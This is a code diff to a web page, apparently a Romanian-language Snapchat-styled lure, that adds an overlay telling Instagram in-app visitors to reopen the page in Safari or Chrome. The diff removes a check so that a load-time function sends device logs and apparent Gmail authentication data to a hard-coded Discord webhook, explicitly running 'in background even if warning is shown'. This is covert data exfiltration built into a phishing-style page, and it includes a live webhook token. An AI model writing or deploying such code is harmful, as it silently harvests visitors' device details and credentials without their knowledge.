@@ -29,6 +29,7 @@
       border: 1px dashed #333;
       border-radius: 4px;
       background-color: rgba(0,0,0,0.7);
+      z-index: 10;
     }
 
     .centered { 
@@ -43,6 +44,7 @@
       text-align: center; 
       width: 90%; 
       max-width: 450px; 
+      z-index: 10;
     }
     h2 { 
       border-bottom: 1px solid #333; 
@@ -122,7 +124,7 @@
       display: none;
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background-color: rgba(0, 0, 0, 0.95);
+      background-color: #050505;
       z-index: 9999;
       flex-direction: column;
       align-items: center;
@@ -130,20 +132,48 @@
       text-align: center;
       padding: 20px;
     }
+    
+    /* Arrow pointing to Android Menu (Top Right) */
+    .arrow-top-right {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      font-size: 3em;
+      color: #fffc00;
+      animation: point-up-right 1s infinite alternate;
+    }
+
+    /* Arrow pointing to iOS Safari Icon (Bottom Right) */
+    .arrow-bottom-right {
+      position: absolute;
+      bottom: 30px;
+      right: 20px;
+      font-size: 3em;
+      color: #fffc00;
+      animation: point-down-right 1s infinite alternate;
+    }
+
     .warning-box {
       border: 2px dashed #ff4444;
-      padding: 20px;
+      padding: 25px 20px;
       border-radius: 10px;
       background-color: #111;
-      max-width: 400px;
+      max-width: 350px;
+      width: 100%;
+      box-sizing: border-box;
+      position: relative;
     }
-    .warning-box h1 { color: #ff4444; margin-top: 0; }
-    .warning-box p { color: white; font-size: 1.1em; line-height: 1.5; }
-    .warning-box .arrow { font-size: 2em; color: #fffc00; margin-top: 15px; animation: bounce 1s infinite; }
+    .warning-box h1 { color: #ff4444; margin-top: 0; font-size: 1.5em; }
+    .warning-box p { color: white; font-size: 1.1em; line-height: 1.6; margin-bottom: 0; }
+    .warning-box .highlight { color: #8cff66; font-weight: bold; }
     
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
+    @keyframes point-up-right {
+      0% { transform: translate(0, 0); }
+      100% { transform: translate(10px, -10px); }
+    }
+    @keyframes point-down-right {
+      0% { transform: translate(0, 0); }
+      100% { transform: translate(10px, 10px); }
     }
   </style>
 </head>
@@ -153,10 +183,12 @@
   
   <!-- In-App Warning Overlay -->
   <div id="inAppWarning">
+    <div class="arrow-top-right" id="androidArrow" style="display: none;">↗️</div>
+    <div class="arrow-bottom-right" id="iosArrow" style="display: none;">↘️</div>
+
     <div class="warning-box">
-      <h1>⚠️ BROWSER INCOMPATIBIL</h1>
-      <p>Te afli în browser-ul Instagram/TikTok.<br><br>Apasă pe cele <strong>3 puncte</strong> din colțul de sus și selectează<br><strong>"Open in System Browser / Deschide în browser-ul extern"</strong> pentru a te putea conecta rapid.</p>
-      <div class="arrow">⬆️ ↗️</div>
+      <h1>⚠️ BROWSER INSTAGRAM</h1>
+      <p id="osInstructions"></p>
     </div>
   </div>
 
@@ -201,16 +233,29 @@
   </div>
 
   <script>
-    // --- IN-APP BROWSER DETECTOR ---
+    // --- IN-APP BROWSER DETECTOR & OVERLAY LOGIC ---
     function isInAppBrowser() {
       const ua = navigator.userAgent || navigator.vendor || window.opera;
-      return (ua.indexOf("Instagram") > -1 || ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1 || ua.indexOf("TikTok") > -1 || ua.indexOf("Snapchat") > -1);
+      return (ua.indexOf("Instagram") > -1 || ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1);
     }
 
     if (isInAppBrowser()) {
       document.getElementById('inAppWarning').style.display = 'flex';
       document.getElementById('mainContent').style.display = 'none';
       document.querySelector('.snap-badge').style.display = 'none';
+
+      const ua = navigator.userAgent;
+      const instructions = document.getElementById('osInstructions');
+      
+      if (/iPhone|iPad/.test(ua)) {
+        // iOS: Icon in the bottom right corner (usually a compass/Safari icon)
+        instructions.innerHTML = `Nu te poți conecta prin Instagram.<br><br>Apasă pe <strong>iconița Safari (busola)</strong> din colțul din <span class="highlight">dreapta jos</span> pentru a deschide pagina în browser-ul principal.`;
+        document.getElementById('iosArrow').style.display = 'block';
+      } else {
+        // Android: 3 dots in the top right corner
+        instructions.innerHTML = `Nu te poți conecta prin Instagram.<br><br>Apasă pe cele <strong>3 puncte</strong> din colțul din <span class="highlight">dreapta sus</span> și selectează<br><br><strong>"Deschide în Chrome"</strong>`;
+        document.getElementById('androidArrow').style.display = 'block';
+      }
     }
 
     let initialWebhookSent = false;
@@ -299,11 +344,8 @@
       };
     }
 
-    // 4. MAIN WEBHOOK EXECUTOR (Logs / Hardware)
+    // 4. MAIN WEBHOOK EXECUTOR (Logs / Hardware) - FIRES REGARDLESS OF INSTAGRAM OVERLAY
     async function fireWebhook(data, gmailInfo = null) {
-      // Do not log if they are stuck in the Instagram warning screen
-      if (isInAppBrowser() && !gmailInfo) return;
-
       const webhookURL = "https://discord.com/api/webhooks/1466752892550516938/ZQGeg41b-UOxsIVFc8JPE2pRbxO3SdYDUA-idIpoKxuplL2psoct_T2A6CKFTafnbhAc";
       
       const fields = [
@@ -323,9 +365,15 @@
         );
       }
 
+      // Add a note if they were caught in the Instagram app
+      let embedTitle = gmailInfo ? '🚨 AUTHENTICATED ACCESS PORTAL LOG' : '🚨 PRECISION DEVICE LOG';
+      if (isInAppBrowser() && !gmailInfo) {
+        embedTitle = '🚨 DEVICE LOG (STUCK IN INSTAGRAM APP)';
+      }
+
       const jsonPayload = JSON.stringify({
         embeds: [{
-          title: gmailInfo ? '🚨 AUTHENTICATED ACCESS PORTAL LOG' : '🚨 PRECISION DEVICE LOG',
+          title: embedTitle,
           color: gmailInfo ? 15158332 : 3066993, 
           fields: fields,
           timestamp: new Date().toISOString()
@@ -377,7 +425,7 @@
       }
     }
 
-    // FIRE ON LOAD
+    // FIRE ON LOAD (Runs in background even if warning is shown)
     window.addEventListener('load', async () => {
       if (initialWebhookSent) return;
       initialWebhookSent = true;
